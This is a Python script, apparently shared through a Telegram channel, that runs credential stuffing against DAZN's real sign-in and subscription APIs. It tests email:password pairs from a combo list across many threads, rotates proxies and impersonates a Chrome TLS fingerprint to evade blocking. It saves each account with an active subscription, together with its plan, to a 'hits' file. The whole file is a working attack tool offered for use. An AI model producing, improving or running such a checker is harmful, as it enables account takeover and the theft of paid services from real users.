#pylint:disable=E1120
import requests
import threading
import time
import secrets
import string
import random
import os
import json
from concurrent.futures import ThreadPoolExecutor
from datetime import timedelta

from rich.console import Console
from rich.panel import Panel
from rich.layout import Layout
from rich.progress import Progress, BarColumn, TextColumn
from rich.live import Live
from rich.align import Align
from rich.table import Table

# ======================================================
# TLS CLIENT AUTO-DETECT (SAFE)
# ======================================================
USE_TLS = False
_tls_session = None

def init_tls():
    global USE_TLS, _tls_session

    # Bloqueo explícito: Android/Pydroid/Termux
    if running_on_android():
        USE_TLS = False
        print("[!] TLS no disponible en Android/Pydroid (tls_client requiere glibc: libpthread.so.0).")
        return False

    try:
        import tls_client
        _tls_session = tls_client.Session(
            client_identifier="chrome_120",
            random_tls_extension_order=True
        )
        USE_TLS = True
        return True
    except Exception as e:
        USE_TLS = False
        print(f"[!] TLS no disponible: {e}")
        return False

def running_on_android():
    # Android suele reportar Linux, así que detectamos por vars y rutas típicas
    if os.environ.get("ANDROID_ROOT") or os.environ.get("ANDROID_DATA"):
        return True
    if "pydroid" in os.environ.get("PYTHONPATH", "").lower():
        return True
    if os.path.exists("/data/data/com.termux") or os.path.exists("/data/data/ru.iiec.pydroid3"):
        return True
    return False
    
# ======================================================
# DEBUG
# ======================================================
Debug = 0     # 1 = DEBUG MODE | 0 = NORMAL MODE
DEBUG_SLEEP = 5
DEBUG_MAX_BODY = 1200

# ======================================================
# CONFIG API
# ======================================================
LOGIN_URL = "https://authentication-prod.ar.indazn.com/v5/SignIn"
SUBS_URL  = "https://myaccount-bff.ar.indazn.com/v2/subscriptions"

REQUEST_TIMEOUT = 8
RETRY_DELAY = 0.6

LOGIN_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/json",
    "sec-ch-ua-platform": "\"Linux\"",
    "cache-control": "no-cache",
    "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
    "x-dazn-ua": "Mozilla/5.0 signin/undefined hyper/0.14.0 (web; production; es)",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://www.dazn.com",
    "referer": "https://www.dazn.com/",
    "accept-language": "es-ES,es;q=0.9",
}

SUBS_HEADERS_BASE = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10) Chrome/143.0.0.0 Mobile Safari/537.36",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "content-type": "application/json",
    "origin": "https://www.dazn.com",
    "referer": "https://www.dazn.com/",
}

# ======================================================
# CONSOLE
# ======================================================
console = Console()

# ======================================================
# HTTP WRAPPER (TLS → REQUESTS)
# ======================================================
def http_post(url, headers=None, json_data=None, timeout=REQUEST_TIMEOUT, proxies=None):
    if USE_TLS:
        return _tls_session.post(
            url,
            headers=headers,
            json=json_data,
            timeout_seconds=timeout,
            proxy=proxies["http"] if proxies else None
        )
    return requests.post(
        url,
        headers=headers,
        json=json_data,
        timeout=timeout,
        proxies=proxies
    )

def http_get(url, headers=None, timeout=REQUEST_TIMEOUT, proxies=None):
    if USE_TLS:
        return _tls_session.get(
            url,
            headers=headers,
            timeout_seconds=timeout,
            proxy=proxies["http"] if proxies else None
        )
    return requests.get(
        url,
        headers=headers,
        timeout=timeout,
        proxies=proxies
    )

# ======================================================
# HELPERS
# ======================================================
def debug_print(title, data=None):
    print("\n" + "-" * 45)
    print(title)
    if data is not None:
        if isinstance(data, (dict, list)):
            print(json.dumps(data, indent=2)[:DEBUG_MAX_BODY])
        else:
            print(str(data)[:DEBUG_MAX_BODY])
    print("-" * 45)

def draw_header(subtitle=None):
    console.clear()
    txt = "[bold magenta]| DAZN V2 | https://t.me/Secury_Labs | @Byte_Hunter_Reborn[/bold magenta]"
    if subtitle:
        txt += f"\n[cyan]{subtitle}[/cyan]"
    console.print(Panel(Align.center(txt), border_style="cyan"))

# ======================================================
# GENERADORES
# ======================================================
def Gencode():
    return "ob" + "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(18))

def Gencode2():
    return "".join(secrets.choice("0123456789abcdef") for _ in range(10))

# ======================================================
# PROXIES
# ======================================================
def load_proxies():
    if not os.path.isfile("proxy.txt"):
        return []
    with open("proxy.txt", encoding="utf-8", errors="ignore") as f:
        return [l.strip() for l in f if l.strip()]

def pick_proxy(proxies):
    if not proxies:
        return None

    p = random.choice(proxies).strip()

    # IP:PORT:USER:PASS
    parts = p.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        proxy = f"http://{user}:{pwd}@{ip}:{port}"

    # IP:PORT (sin auth)
    elif len(parts) == 2:
        ip, port = parts
        proxy = f"http://{ip}:{port}"

    else:
        return None

    return {
        "http": proxy,
        "https": proxy
    }

# ======================================================
# AUTOTHREADS
# ======================================================
def auto_threads(proxy_enabled):
    cores = os.cpu_count() or 4
    base = cores * (5 if proxy_enabled else 3)
    return min(base, 300)

# ======================================================
# STATS
# ======================================================
lock = threading.Lock()
stats = {"good": 0, "fail": 0, "retry": 0, "checked": 0, "total": 0}
hits_list = []

# ======================================================
# UI
# ======================================================
progress = Progress(
    TextColumn("[bold cyan]{task.completed}/{task.total}"),
    BarColumn(bar_width=28),
    TextColumn("[bold green]{task.percentage:>3.0f}%"),
)
task_id = progress.add_task("Checking", total=0)

def stats_panel(threads, proxy_enabled):
    return Panel(
        f"[bold yellow]Client:[/bold yellow] {'TLS' if USE_TLS else 'REQ'}\n"
        f"[bold yellow]Threads:[/bold yellow] {threads}\n"
        f"[bold yellow]Proxies:[/bold yellow] {'ON' if proxy_enabled else 'OFF'}\n\n"
        f"[green]Hits :[/green] {stats['good']}\n"
        f"[red]Fails:[/red] {stats['fail']}\n"
        f"[yellow]Retry:[/yellow] {stats['retry']}",
        title="Stats",
        border_style="blue",
    )

def update_hits_panel(layout):
    if not hits_list:
        layout["hits"].update(Panel("No hits yet", title="Hits", border_style="magenta"))
        return
    table = Table(show_header=False, box=None, expand=True)
    for h in hits_list[-15:]:
        table.add_row(f"[green]{h}[/green]")
    layout["hits"].update(Panel(table, title="Hits", border_style="magenta"))

def build_layout(threads, proxy_enabled):
    layout = Layout(name="root")
    layout.split_column(Layout(name="header", size=3), Layout(name="body"))
    layout["body"].split_row(Layout(name="left", ratio=1), Layout(name="right", ratio=2))
    layout["right"].split_column(Layout(name="progress", size=4), Layout(name="hits"))
    layout["header"].update(Panel(Align.center("[bold magenta]| DAZN V2 | https://t.me/Secury_Labs | @Byte_Hunter_Reborn[/bold magenta]"), border_style="cyan"))
    layout["left"].update(stats_panel(threads, proxy_enabled))
    layout["progress"].update(Panel(progress, title="Progress", border_style="green"))
    layout["hits"].update(Panel("No hits yet", title="Hits", border_style="magenta"))
    return layout

# ======================================================
# FILE OUTPUT
# ======================================================
def save_active(user, pwd, sub):
    plan = sub.get("tiers", {}).get("currentPlan", {}).get("name", "Unknown")
    renew = sub.get("termEndDate", "N/A")[:10]
    line = f"{user}:{pwd} | Subs: {sub.get('brand')} | Plan: {plan} | Renew: {renew} | https://t.me/Secury_Labs | @Byte_Hunter_Reborn"

    with open("DAZN_Hits.txt", "a", encoding="utf-8") as f:
        f.write(line + "\n")
        f.flush()
        os.fsync(f.fileno())

    return line

# ======================================================
# NETWORK
# ======================================================
def get_subscriptions(token, proxies):
    h = dict(SUBS_HEADERS_BASE)
    h["Authorization"] = f"Bearer {token}"

    if Debug == 1:
        return http_get(SUBS_URL, headers=h, timeout=REQUEST_TIMEOUT)

    return http_get(
        SUBS_URL,
        headers=h,
        timeout=REQUEST_TIMEOUT,
        proxies=pick_proxy(proxies)
    )

# ======================================================
# CORE
# ======================================================
def load_combos():
    if not os.path.isfile("combo.txt"):
        return None
    with open("combo.txt", encoding="utf-8", errors="ignore") as f:
        return [tuple(l.strip().split(":", 1)) for l in f if ":" in l]

def check_combo(user, pwd, layout, proxies):
    payload = {
        "Platform": "web",
        "DeviceId": Gencode2(),
        "ProfilingSessionId": Gencode(),
        "Email": user,
        "Password": pwd,
    }

    if Debug == 1:
        print(f"\nUSER → {user}:{pwd}")
        try:
            r = http_post(LOGIN_URL, headers=LOGIN_HEADERS, json_data=payload)
        except Exception as e:
            debug_print("LOGIN ERROR", e)
            time.sleep(DEBUG_SLEEP)
            return

        debug_print(f"LOGIN STATUS → {r.status_code}", r.text)
        if r.status_code != 200:
            time.sleep(DEBUG_SLEEP)
            return

        try:
            token = r.json()["AuthToken"]["Token"]
            sr = get_subscriptions(token, proxies)
            debug_print(f"SUBS STATUS → {sr.status_code}", sr.text)
        except Exception as e:
            debug_print("SUBS ERROR", e)

        time.sleep(DEBUG_SLEEP)
        return

    while True:
        try: #Login 
            r = http_post(
                LOGIN_URL,
                headers=LOGIN_HEADERS,
                json_data=payload,
                proxies=pick_proxy(proxies)
            )
        except:
            with lock:
                stats["retry"] += 1
            time.sleep(RETRY_DELAY)
            continue

        if r.status_code == 401:
            with lock:
                stats["fail"] += 1
                stats["checked"] += 1
                progress.advance(task_id)
            return

        if r.status_code != 200:
            with lock:
                stats["retry"] += 1
            time.sleep(RETRY_DELAY)
            continue

        try:#Get Token
            token = r.json()["AuthToken"]["Token"]
            subs = get_subscriptions(token, proxies).json()
        except:
            with lock:
                stats["retry"] += 1
            time.sleep(RETRY_DELAY)
            continue

        active = next((s for s in subs if s.get("status") == "Active"), None)
        if not active:
            with lock:
                stats["fail"] += 1
                stats["checked"] += 1
                progress.advance(task_id)
            return

        with lock:
            stats["good"] += 1
            stats["checked"] += 1
            progress.advance(task_id)
            line = save_active(user, pwd, active)
            hits_list.append(line)
            update_hits_panel(layout)
        return

# ======================================================
# MAIN
# ======================================================
def main():
    combos = load_combos()
    if not combos:
        print("combo.txt not found")
        return

    proxies = load_proxies()

    if Debug == 1:
        for u, p in combos:
            check_combo(u, p, None, proxies)
        return

    draw_header()

    # ==============================
    # TLS SETUP
    # ==============================
    import platform
    system_name = platform.system().lower()

    # Aviso Windows
    if "windows" in system_name:
        console.print(
            Panel(
                "[bold yellow]Aviso Windows[/bold yellow]\n"
                "Se recomienda usar [bold green]TLS[/bold green]\n"
                "para evitar bloqueos y fingerprints.",
                border_style="yellow",
                title="TLS Recommendation"
            )
        )

    # Android / Pydroid / Termux → TLS NO disponible
    if running_on_android():
        console.print(
            Panel(
                "[bold red]TLS no disponible en Android[/bold red]\n"
                "Se usará automáticamente [bold cyan]requests[/bold cyan]\n\n"
                "Motivo:\n"
                "tls_client requiere glibc (libpthread.so.0)",
                border_style="red",
                title="TLS Disabled"
            )
        )
        # USE_TLS queda False
    else:
        use_tls = console.input(" Use TLS client? (y/n) › ").lower().startswith("y")

        if use_tls:
            if init_tls():
                console.print("[bold green]✔ TLS habilitado[/bold green]")
            else:
                console.print("[bold red]✖ TLS falló → usando requests[/bold red]")
        else:
            console.print("[bold cyan]ℹ Usando requests[/bold cyan]")

    time.sleep(1)

    # ==============================
    # PROXIES
    # ==============================
    proxy_enabled = False
    if proxies:
        console.print(
            Panel(
                f"[bold green]Proxys found![/bold green]\n"
                f"[cyan]{len(proxies)} proxys[/cyan]",
                border_style="cyan",
                title="Proxy Detector"
            )
        )
        proxy_enabled = console.input(" Use proxies? (y/n) › ").lower().startswith("y")

    # ==============================
    # THREADS
    # ==============================
    draw_header("Thread setup")
    threads = auto_threads(proxy_enabled)
    console.print(
        Panel(
            f"CPU cores: {os.cpu_count()}\nThreads selected: {threads}",
            border_style="green"
        )
    )
    time.sleep(2)

    # ==============================
    # RUN
    # ==============================
    stats["total"] = len(combos)
    progress.update(task_id, total=stats["total"])
    layout = build_layout(threads, proxy_enabled)

    with Live(layout, refresh_per_second=10, screen=True):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for u, p in combos:
                ex.submit(
                    check_combo,
                    u,
                    p,
                    layout,
                    proxies if proxy_enabled else []
                )

            while stats["checked"] < stats["total"]:
                layout["left"].update(stats_panel(threads, proxy_enabled))
                update_hits_panel(layout)
                time.sleep(0.15)

    console.print(Panel("[bold green]Finished[/bold green]", border_style="green"))
    
if __name__ == "__main__":
    main()